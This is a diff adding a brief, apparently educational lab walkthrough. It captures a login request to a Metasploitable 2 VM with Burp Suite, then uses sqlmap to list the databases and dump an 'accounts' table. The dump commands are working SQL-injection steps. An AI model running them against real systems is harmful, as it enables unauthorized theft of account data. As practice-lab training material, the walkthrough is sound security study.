@@ -1,0 +1,30 @@
+1. Firstly we will see the Ip address on the Kali 
+ifconfig
+
+2. Assign the Ip addres to the Metasploitable 2
+sudo ifconfig eth0 192.168.119.2 netmask 255.255.255.0
+
+3. Now ping the Kali to Metasploit
+ping 192.168.119.2
+
+4. Open the Burp Suit and start Burp and turn on the Intercepter 
+
+5. Open the Browser and configure proxy to Manual proxy.
+
+6. open the Metasploitable 2 in browser with the Ip address assigned to it.
+
+7. enter any username and pasword.\
+
+8. check the burp suit for the captured file and save file.
+
+9. open kali terminal and type
+sqlmap
+
+10. next use this command
+sqlmap -r file path --dbs
+
+11. to see the dump data
+sqlmap -r file path -D owasple -T accounts --dump
+
+
+
